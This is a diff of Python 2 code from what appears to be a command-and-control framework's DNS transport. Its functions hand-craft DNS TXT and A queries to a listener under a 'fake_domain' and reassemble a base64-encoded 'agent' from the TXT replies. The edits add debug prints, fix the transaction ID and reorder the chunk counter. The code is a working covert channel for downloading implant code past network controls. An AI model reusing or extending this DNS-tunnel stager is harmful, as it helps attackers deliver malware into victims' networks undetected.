@@ -731,7 +731,7 @@ def build_routing_packet(stagingKey, sessionID, meta=0, additional=0, encData=''
 
 def pack_hostname_txt(prefix, counter, fake_domain):
     hostname = prefix + str(counter) + '.' + fake_domain
-    print "packing hostname for TXT {}".format(hostname)
+    print "[pack_hostname_txt] packing hostname for TXT {}".format(hostname)
     bytes_txt_host = bytearray()
     for label in hostname.split('.'):
         tmp = bytearray()
@@ -744,7 +744,7 @@ def pack_hostname_txt(prefix, counter, fake_domain):
 
 def pack_hostname_init(prefix, fake_domain):
     hostname = prefix + '.' + fake_domain
-    print "packing hostname for init {}".format(hostname)
+    print "[pack_hostname_init] packing hostname for init {}".format(hostname)
     bytes_init_host = bytearray()
     for label in hostname.split('.'):
         tmp = bytearray()
@@ -797,15 +797,23 @@ def extract_payload(payload):
         ba=ba[lab_len+1:]
 
     if len(hostname) == 3:
-        print "Hostname {}.{}.{}".format(hostname[0],hostname[1],hostname[2])
+        print "[extract_payload] Hostname {}.{}.{}".format(hostname[0],hostname[1],hostname[2])
 
     label = str(ba[18:-1])
     #print "Extracted label {} from pkt".format(binascii.hexlify(label))
     return label
+
+def send_init_txt_to_listener(sock, prefix, host, port, fake_domain):
+    txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
+    dns_flags = txn_id_bytes + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))
+    bytes_txt_host = pack_hostname_init(prefix, fake_domain)
+    txt_request = dns_flags + bytes_txt_host + bytearray(struct.pack('BBBB',0,16,0,1))
+    sock.sendto(txt_request,(host,int(port)))    
+    reply,server_reply=sock.recvfrom(512)
+    # TODO check reply IP address
     
 def recv_data_from_listener(prefix, sock, fake_domain, host, port):
-    #txn_int = int("e347",16)
-    txn_int = random.randint(60000,65535)
+    txn_int = int("e348",16)
     agent_base64 = []
     agent_tmp = ''
 
@@ -819,10 +827,9 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
             dns_flags = txn_id_bytes + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))
             bytes_txt_host = pack_hostname_txt(prefix, counter, fake_domain)
             txt_request = dns_flags + bytes_txt_host + bytearray(struct.pack('BBBB',0,16,0,1))
+            print "sending TXT request with hostname {}".format(prefix+str(counter)+'.'+fake_domain)
             sock.sendto(txt_request,(host,int(port)))
-            counter += 1
             sock.settimeout(5)
-            print "sending TXT request with hostname {}".format(host)
             agent_tmp,server_rcpt=sock.recvfrom(512)
             # TODO check for TXT response with TXT stop transfer hostname
             if is_end_of_transfer(agent_tmp):
@@ -830,6 +837,7 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
                 break
             b64_label = extract_payload(agent_tmp)
             #print "B64 " + str(b64_label)
+            counter += 1
             txn_int += 1
             agent_base64.append(b64_label)
             #print "b64_label: {}".format(b64_label)
@@ -869,15 +877,6 @@ def send_init_a_to_listener(sock, prefix, host, port, fake_domain):
     print "about to send A record"
     sock.sendto(a_record,(host,int(port)))
     print "waiting for reply"
-    reply,server_reply=sock.recvfrom(512)
-    # TODO check reply IP address
-
-def send_init_txt_to_listener(sock, prefix, host, port, fake_domain):
-    txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
-    dns_flags = txn_id_bytes + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))
-    bytes_txt_host = pack_hostname_init(prefix, fake_domain)
-    txt_request = dns_flags + bytes_txt_host + bytearray(struct.pack('BBBB',0,16,0,1))
-    sock.sendto(txt_request,(host,int(port)))    
     reply,server_reply=sock.recvfrom(512)
     # TODO check reply IP address
     
